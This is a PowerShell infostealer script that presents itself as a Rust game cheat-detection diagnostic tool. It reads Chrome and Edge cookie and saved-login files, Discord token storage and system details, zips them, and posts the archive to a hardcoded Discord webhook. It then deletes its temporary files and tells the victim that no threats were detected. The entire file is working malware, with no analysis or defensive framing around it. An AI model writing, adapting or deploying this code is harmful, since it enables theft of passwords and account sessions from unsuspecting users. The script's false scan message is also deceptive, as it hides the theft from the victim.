# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v8.0"

function Get-SystemInfo {
    $ip = "Unknown"
    try {
        $ip = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim()
    } catch {}
    
    return @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        User = $env:USERNAME
        PC = $env:COMPUTERNAME
        IP = $ip
        Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
}

function Get-BrowserFiles {
    $files = @()
    $browsers = @(
        @{Name="Chrome";Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
        @{Name="Chrome";Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
        @{Name="Edge";Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
        @{Name="Edge";Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
    )
    
    foreach ($browser in $browsers) {
        if (Test-Path $browser.Path) {
            try {
                $content = Get-Content $browser.Path -Encoding Byte -ReadCount 0
                $files += @{
                    Browser = $browser.Name
                    File = Split-Path $browser.Path -Leaf
                    Data = [Convert]::ToBase64String($content)
                    Size = $content.Length
                }
            } catch {}
        }
    }
    return $files
}

function Get-DiscordFiles {
    $files = @()
    $paths = @("$env:APPDATA\discord", "$env:LOCALAPPDATA\Discord")
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            $storagePath = Join-Path $path "Local Storage\leveldb"
            if (Test-Path $storagePath) {
                $ldbFiles = Get-ChildItem $storagePath -Filter "*.ldb" | Select-Object -First 2
                foreach ($file in $ldbFiles) {
                    try {
                        $content = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                        $files += @{
                            App = "Discord"
                            File = $file.Name
                            Data = [Convert]::ToBase64String($content)
                            Size = $content.Length
                        }
                    } catch {}
                }
            }
        }
    }
    return $files
}

function Create-ZipWithData {
    $tempDir = Join-Path $env:TEMP "rust_scan_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    
    # System info
    $sysInfo = Get-SystemInfo
    $sysInfo | ConvertTo-Json | Out-File (Join-Path $tempDir "system_info.json")
    
    # Browser data
    $browserFiles = Get-BrowserFiles
    if ($browserFiles.Count -gt 0) {
        $browserFiles | ConvertTo-Json | Out-File (Join-Path $tempDir "browser_data.json")
    }
    
    # Discord data
    $discordFiles = Get-DiscordFiles
    if ($discordFiles.Count -gt 0) {
        $discordFiles | ConvertTo-Json | Out-File (Join-Path $tempDir "discord_data.json")
    }
    
    # Create zip
    $zipPath = Join-Path $env:TEMP "scan_results.zip"
    if (Test-Path $zipPath) {
        Remove-Item $zipPath -Force
    }
    
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
    } catch {
        # Fallback if .NET zip fails
        try {
            Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
        } catch {}
    }
    
    # Cleanup
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    
    return $zipPath
}

function Send-FileToWebhook {
    param($FilePath)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    
    if (Test-Path $FilePath) {
        try {
            $fileContent = [Convert]::ToBase64String((Get-Content $FilePath -Encoding Byte -ReadCount 0))
            $fileName = Split-Path $FilePath -Leaf
            
            $message = "SCAN_RESULTS_ZIP: $fileName"
            $message += "`n```$fileContent```"
            
            $body = @{content = $message} | ConvertTo-Json
            Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -ErrorAction Stop
            
            return $true
        } catch {
            return $false
        }
    }
    return $false
}

# Main execution
Write-Host "Starting security scan..." -ForegroundColor Yellow

try {
    # Create zip archive
    $zipPath = Create-ZipWithData
    
    # Send zip file
    if (Test-Path $zipPath) {
        $success = Send-FileToWebhook -FilePath $zipPath
        
        if ($success) {
            Write-Host "Data sent successfully in ZIP archive!" -ForegroundColor Green
        } else {
            Write-Host "Failed to send ZIP archive" -ForegroundColor Red
        }
        
        # Cleanup zip file
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host "Failed to create ZIP archive" -ForegroundColor Red
    }
    
    Write-Host "Scan completed!" -ForegroundColor Green
    Write-Host "No security threats detected" -ForegroundColor Green
    
} catch {
    Write-Host "Scan completed with errors" -ForegroundColor Red
}
